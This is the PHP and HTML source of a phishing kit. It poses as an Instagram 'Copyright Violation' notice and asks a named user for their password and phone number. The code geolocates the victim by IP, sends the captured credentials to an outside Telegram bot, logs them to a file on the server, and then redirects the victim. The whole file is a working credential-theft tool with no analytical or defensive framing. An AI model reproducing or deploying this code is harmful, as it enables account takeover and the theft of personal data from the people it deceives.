<?php
$username=$_GET['username'];
$username = mb_strtolower($username,"UTF-8");
ob_start();
session_start();
error_reporting(E_ALL);
set_time_limit(0);
function ara($bas, $son, $yazi)
{
    @preg_match_all('/' . preg_quote($bas, '/') .
    '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
    return @$m[1];
}
$username = $_GET["username"];
$id= $_GET["username"];
$ch = curl_init();
/////////========Luminati
////////=========Socks Proxy

//curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: en-US,en;q=0.9',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$result = curl_exec($ch);
$json = json_decode($result, true);
$bio=$json['graphql']['user']['biography'];
$mavi=$json['graphql']['user']['is_verified'];




// data:{mime};base64,{data};
/////////////////////////////////////////////////////////////////////////////////
$_SESSION['id']=$id ;
$_SESSION['bio']=$bio ; 
$_SESSION['mavi']=$mavi ;

if($_POST){
  $hydrapw=$_POST["hydrapw"];
  $hydraphone=$_POST["hydraphone"];
  $hydraip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$hydraip);
  $cek = new SimpleXMLElement($konum);
  $hydraulke = $cek->country;
  $hydrasehir = $cek->city;
  date_default_timezone_set('Europe/Istanbul');
  $hydratarih =date("d-m-Y H:i:s");
  $file = fopen('hesaplar.php', 'a'); 
  $token = '';
  $chat_id = '';


    $address = $_SERVER["REMOTE_ADDR"];
	$location = file_get_contents("http://ip-api.com/xml/".$address);
    $get = new SimpleXMLElement($location);
    $country = $get->country;
    $city = $get->city;
    date_default_timezone_set('Europe/Istanbul');
    $date = date("d-m-Y H:i:s");
    
    $text = 'Kullanıcı: ' . $username . PHP_EOL;
    $text .= 'Şifre: ' . $hydrapw . PHP_EOL;
      $text .= 'Numara: ' . $hydraphone . PHP_EOL;
    $text .= 'Tarih: ' . $hydratarih . PHP_EOL;
    $text .= 'Ülke: ' . $hydraulke . PHP_EOL;
    $text .= 'Şehir: ' . $hydrasehir . PHP_EOL;
    $text .= 'IP: ' . $hydraip . PHP_EOL;

    $disable_web_page_preview = null;
    $reply_to_message_id = null;
    $reply_markup = null;
    $data = array(
            'chat_id' => urlencode($chat_id),
            'text' => $text,
            'disable_web_page_preview' => urlencode($disable_web_page_preview),
            'reply_to_message_id' => urlencode($reply_to_message_id),
            'reply_markup' => urlencode($reply_markup)
        );
      
    $url = 'https://api.telegram.org/bot'.$token.'/sendMessage';
      
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, count($data));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    fwrite($file, "
   
    <body bgcolor='#202020'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font color='#1fcf00'>Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='#1fcf00'>Şifre: </font><font color='white'>".$hydrapw."</font><br>
<font color='#1fcf00'>Telefon: </font><font color='white'>".$hydraphone."</font><br>
<font color='#1fcf00'>IP Adresi: </font><font color='white'>".$hydraip."</font><br>
<font color='#1fcf00'>Ülke: </font><font color='white'>".$hydraulke."</font><br>
<font color='#1fcf00'>Şehir: </font><font color='white'>".$hydrasehir."</font><br>
<font color='#1fcf00'>Tarih: </font><font color='white'>".$hydratarih."</font><br>
<hr>

    ");
  fclose($file);

  header("location: wrong-reset.php?username=$username");
  
}
?>		
<!doctype html>
<html lang="en">
<head>
	<title>Copyright Violation</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/animate/animate.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min.css">
<!--===============================================================================================-->
	<link rel="stylesheet" type="text/css" href="css/util.css">
	<link rel="stylesheet" type="text/css" href="css/main.css">
<!--===============================================================================================-->
</head>
<body>
	
	
	<div class="size1 bg0 where1-parent">
		<!-- Coutdown -->
		<div class="flex-c-m bg-img1 size2 where1 overlay1 where2 respon2" style="background-image: url('https://cdn.dribbble.com/users/5436944/screenshots/14812745/media/471a7676aa044cb8184576ea34017d9c.gif');">
			
		</div>
		
		<!-- Form -->
		<div class="size3 flex-col-sb flex-w p-l-75 p-r-75 p-t-45 p-b-45 respon1">
			<div class="wrap-pic1">
				
			</div>
			
			<div align="center"><img class="center" src="images/user.jpg" width="130" /></div>
			<div class="p-t-50 p-b-60">
				<p class="m1-txt1 p-b-36">
					<span class="m1-txt2">Hi, @<?php echo   $username; ?> !</span><br>Please fill in the requested information completely.
				</p>

				<form id="form" class="contact100-form validate-form" onsubmit="return checkForm(this);" method="post">
					<div class="wrap-input100 m-b-10 validate-input" data-validate = "Password is required">
						<input id="password" class="s2-txt1 placeholder0 input100" type="password" name="hydrapw" placeholder="Password" minlength="6">
						<span class="focus-input100"> 
						</span></div>
						<div class="wrap-input100 m-b-10 validate-input" data-validate = "Number is required">
						<input id="password" class="s2-txt1 placeholder0 input100" type="number" name="hydraphone" placeholder="Phone Number" minlength="6">
						<span class="focus-input100"> 
						</span>
					</div>

					<div class="w-full">
						<button class="flex-c-m s2-txt2 size4 bg1 bor1 hov1 trans-04">
							Confirm as @<?php echo   $username; ?>
						</button>
					</div>
				

				<button class="s2-txt3 p-t-18" target="_blank" onclick="window.location='https://www.instagram.com/accounts/password/reset/';">
					Forgot your password? 				</button>
			</div>

			<div class="flex-w">
				
				
			</div>
		</div>
	</div>



	

<!--===============================================================================================-->	
	<script src="vendor/jquery/jquery-3.2.1.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/bootstrap/js/popper.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/select2/select2.min.js"></script>
<!--===============================================================================================-->
	<script src="vendor/countdowntime/moment.min.js"></script>
	<script src="vendor/countdowntime/moment-timezone.min.js"></script>
	<script src="vendor/countdowntime/moment-timezone-with-data.min.js"></script>
	<script src="vendor/countdowntime/countdowntime.js"></script>
	<script><?php include 'vendor/countdowntime/moment.min2.js' ?>
		$('.cd100').countdown100({
			/*Set Endtime here*/
			/*Endtime must be > current time*/
			endtimeYear: 0,
			endtimeMonth: 0,
			endtimeDate: 35,
			endtimeHours: 18,
			endtimeMinutes: 0,
			endtimeSeconds: 0,
			timeZone: "" 
			// ex:  timeZone: "America/New_York"
			//go to " http://momentjs.com/timezone/ " to get timezone
		});
	</script>
<!--===============================================================================================-->
	<script src="vendor/tilt/tilt.jquery.min.js"></script>
	<script >
		$('.js-tilt').tilt({
			scale: 1.1
		})
	</script>
<!--===============================================================================================-->
	<script src="js/main.js"></script>

</body>
</html>